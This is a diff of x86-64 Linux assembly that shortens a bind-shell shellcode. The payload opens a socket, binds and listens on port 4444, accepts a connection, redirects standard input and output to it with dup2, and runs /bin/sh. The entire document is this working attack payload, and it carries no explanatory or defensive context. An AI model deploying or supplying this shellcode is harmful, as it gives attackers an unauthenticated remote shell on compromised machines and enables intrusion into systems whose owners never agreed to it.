@@ -7,13 +7,12 @@ _start:
 	; socket(AF_INET, SOCK_STREAM, 0)
 	; (2, 1, 0)
 
-	xor rax, rax
-	mov rdx, rax
-	mov al, 41
-	mov rsi, rdx
-	inc rsi
-	mov rdi, rsi
-	inc rdi
+	xor rdx, rdx
+	lea rsi, [rdx + 1]
+	lea rdi, [rdx + 2]
+
+	push 0x29
+	pop rax ; SYS_socket
 
 	syscall
 
@@ -21,29 +20,32 @@ _start:
 
 	; bind(sockfd, &saddr, 0x10)
 	
-	mov rdi, r8
-	mov al, 49
+	xchg rdi, rax
+
 	push rdx
-	push rdx
-	mov byte [rsp], 0x2
-	mov word [rsp+2], 0x3905
+	push word 0x5c11
+	push ax
+
 	mov rsi, rsp
 	mov dl, 0x10
+
+	mov al, 0x31 ; SYS_bind
 
 	syscall
 
 	; listen(sockfd, 0x10)
 
-	mov al, 50
 	mov rsi, rdx
+	
+	mov al, 0x32 ; SYS_listen
 
 	syscall
 
 	; accept(sockfd, NULL, NULL)
 	
-	mov al, 43
 	xor rsi, rsi
-	xor rdx, rdx
+
+	mov al, 0x2b ; SYS_accept
 
 	syscall
 
@@ -52,25 +54,23 @@ _start:
 	; dup2(clientfd, [0,1,2])
 
 	mov rdi, r9
+	mov sil, 2
 	duplicate:
-		mov al, 33
+		mov al, 33 ; SYS_dup2
 		syscall
-		inc sil
-		cmp sil, 0x2
-		jle duplicate
+		dec sil
+		jns duplicate
 
 	; execve("/bin/sh", NULL, NULL)
-	
-	jmp binsh
 
-	shell:
-	mov al, 0x3b
+	xchg rdx, rax
 	xor rsi, rsi
-	xor rdx, rdx
-	pop rdi
 
+	push rsi
+
+	mov rdi, 0x68732f2f6e69622f ; /bin//sh
+	push rdi
+	mov rdi, rsp
+
+	mov al, 0x3b ; SYS_execve
 	syscall
-
-	binsh:
-		call shell
-		db "/bin/sh"
